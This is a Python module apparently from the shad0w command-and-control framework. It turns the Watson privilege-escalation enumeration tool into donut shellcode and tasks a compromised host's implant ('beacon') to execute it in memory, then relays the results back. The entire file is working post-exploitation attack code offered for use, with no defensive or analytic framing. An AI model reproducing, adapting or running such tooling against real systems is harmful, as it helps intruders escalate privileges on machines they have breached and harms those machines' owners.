#
# Execute watson on a session
#

import argparse

from lib import shellcode

__description__ = "Enumerate missing KBs and suggest exploits for PrivESC"
__author__ = "@Flangvik, @_RastaMouse"

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# location of watson binary
WATSON_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/Watson.exe"

# beacon to exec command on
current_beacon = None

# little hack but lets us pass the args to donut
class DummyClass(object):
    def __init__(self):
        pass

def watson_callback(shad0w, data):
    shad0w.event.beacon_info(current_beacon, data)

    return ""

def main(shad0w, args, beacon):
    global current_beacon

    # make beacon global
    current_beacon = beacon

    watson_args = ' '.join(args[1:])

    # kinda a hack to make sure we intergrate nice with the shellcode generator
    args = DummyClass()

    if len(watson_args) != 0:
        args.param = watson_args
    else:
        args.param = False
        watson_args = False

    args.cls = False
    args.method = False
    args.runtime = False
    args.appdomain = False

    #Generate donut base64 shellcode with "AnyCpu" as target, local bin is x86
    b64_comp_data = shellcode.generate(WATSON_BIN, args, watson_args)

    # dont clear the callbacks, cause the responses are chunked
    shad0w.clear_callbacks = False

    shad0w.beacons[current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
    shad0w.beacons[current_beacon]["callback"] = watson_callback
